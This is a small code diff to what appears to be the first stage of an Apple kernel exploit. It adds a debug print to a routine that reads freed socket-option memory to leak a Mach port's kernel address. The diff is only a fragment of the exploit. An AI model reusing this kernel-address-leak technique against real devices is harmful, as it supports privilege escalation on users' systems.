@@ -124,6 +124,7 @@ bool StageOne::GetPortAddr(mach_port_t port, uint32_t expected_ip_bits,
       printf("GetPortAddr: failed to spray\n");
       return false;
     }
+    
     for (uint32_t j = 0; j < dangling_options.size(); j++) {
       int minmtu = -1;
       if (!dangling_options[j]->GetMinmtu(&minmtu)) {
@@ -135,13 +136,15 @@ bool StageOne::GetPortAddr(mach_port_t port, uint32_t expected_ip_bits,
         printf("GetPortAddr: failed to GetPreferTempaddr\n");
       }
       uint64_t maybe_port_kaddr = ((uint64_t)minmtu << 32) | prefer_tempaddr;
+        printf("%llx\n",maybe_port_kaddr);
       if (!LooksLikeKaddr(maybe_port_kaddr)) {
         continue;
       }
+      
       if (!LooksLikePort(maybe_port_kaddr, expected_ip_bits)) {
         continue;
       }
-
+        
       *port_kaddr = maybe_port_kaddr;
       return true;
     }
